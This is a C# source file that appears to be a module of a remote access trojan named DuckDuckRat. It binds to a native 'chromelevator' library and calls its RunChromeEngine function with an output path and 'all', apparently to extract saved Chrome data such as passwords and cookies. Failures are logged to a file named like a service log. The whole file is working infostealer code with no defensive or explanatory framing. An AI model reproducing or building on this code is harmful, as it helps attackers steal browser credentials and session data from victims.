using System;
using System.Runtime.InteropServices;

namespace DuckDuckRat.Modules
{
    public static partial class ChromeEngine
    {
        // This is the function we exported in injector_main.cpp
        // extern "C" __declspec(dllexport) int RunChromeEngine(int argc, wchar_t* argv[])
        [DllImport("chromelevator", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        public static extern int RunChromeEngine(int argc, [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.LPWStr)] string[] argv);

        public static bool ExtractAll(string outputPath)
        {
            try
            {
                // Prepare arguments: [DuckDuckRat.exe, --output-path, {path}, all]
                // Note: argv[0] is usually the program name.
                string[] args = new string[] { 
                    "--output-path", 
                    outputPath, 
                    "all" 
                };

                int result = RunChromeEngine(args.Length, args);
                return result == 0;
            }
            catch (Exception ex)
            {
                System.IO.File.AppendAllText("svc_debug.log", $"[CHROME_ENGINE ERROR] {ex.Message}\n");
                return false;
            }
        }
    }
}


